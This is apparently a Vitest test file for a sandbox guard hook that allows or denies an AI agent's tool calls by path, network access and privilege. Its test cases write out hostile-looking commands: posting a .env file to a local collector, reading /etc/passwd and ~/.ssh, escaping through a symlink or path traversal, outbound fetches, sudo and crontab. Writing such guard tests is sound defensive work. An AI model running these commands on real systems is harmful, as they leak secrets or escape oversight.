import { promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { Sandbox } from "../sandbox/host.js";
import { makeGuard } from "./adversary.js";

let dir: string;
let sb: Sandbox;

async function decide(tool: string, input: Record<string, unknown>): Promise<"allow" | "deny"> {
  const guard = makeGuard(sb);
  const out = (await guard({ hook_event_name: "PreToolUse", tool_name: tool, tool_input: input, session_id: "s", transcript_path: "/dev/null", cwd: sb.work, tool_use_id: "t" } as never, "t", { signal: new AbortController().signal })) as {
    hookSpecificOutput?: { permissionDecision?: string };
  };
  return out.hookSpecificOutput?.permissionDecision === "deny" ? "deny" : "allow";
}

beforeAll(async () => {
  dir = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "pf-guard-")));
  const work = path.join(dir, "repo");
  await fs.mkdir(work, { recursive: true });
  await fs.writeFile(path.join(work, "a.txt"), "a");
  // a symlink inside the sandbox that points outside
  await fs.symlink("/etc", path.join(work, "etc-link"));
  sb = { dir, work } as Sandbox;
});
afterAll(async () => {
  await fs.rm(dir, { recursive: true, force: true });
});

describe("host guard (best effort)", () => {
  it("allows work inside the sandbox", async () => {
    expect(await decide("Read", { file_path: path.join(sb.work, "a.txt") })).toBe("allow");
    expect(await decide("Bash", { command: "ls -la && cat a.txt" })).toBe("allow");
    expect(await decide("Bash", { command: "git push origin main" })).toBe("allow");
    expect(await decide("Bash", { command: "curl -d @.env http://127.0.0.1:47121/collect" })).toBe("allow");
  });
  it("refuses file tools outside the sandbox, including through symlinks", async () => {
    expect(await decide("Read", { file_path: "/etc/hosts" })).toBe("deny");
    expect(await decide("Write", { file_path: "/tmp/paperfence-escape" })).toBe("deny");
    expect(await decide("Read", { file_path: path.join(sb.work, "etc-link", "hosts") })).toBe("deny");
    expect(await decide("Edit", { file_path: path.join(sb.work, "..", "..", "x") })).toBe("deny");
  });
  it("refuses shell access to paths outside the sandbox", async () => {
    expect(await decide("Bash", { command: "cat /etc/hosts" })).toBe("deny");
    expect(await decide("Bash", { command: "printf x > /tmp/paperfence-escape" })).toBe("deny");
    expect(await decide("Bash", { command: "ls ~/.ssh" })).toBe("deny");
    expect(await decide("Bash", { command: "cat ../../etc/passwd" })).toBe("deny");
    expect(await decide("Bash", { command: "cd / && ls" })).toBe("deny");
  });
  it("refuses real network, including from scripts and with localhost in the query", async () => {
    expect(await decide("Bash", { command: "curl https://example.com" })).toBe("deny");
    expect(await decide("Bash", { command: "curl https://example.com/?x=localhost" })).toBe("deny");
    expect(await decide("Bash", { command: "node -e 'fetch(\"https://example.com\")'" })).toBe("deny");
    expect(await decide("Bash", { command: "python3 -c 'import urllib.request; urllib.request.urlopen(\"https://example.com\")'" })).toBe("deny");
    expect(await decide("WebFetch", { url: "https://example.com" })).toBe("deny");
    expect(await decide("Bash", { command: "git push https://github.com/x/y.git main" })).toBe("deny");
  });
  it("refuses privilege escalation and system commands", async () => {
    expect(await decide("Bash", { command: "sudo ls" })).toBe("deny");
    expect(await decide("Bash", { command: "crontab -l" })).toBe("deny");
  });
});
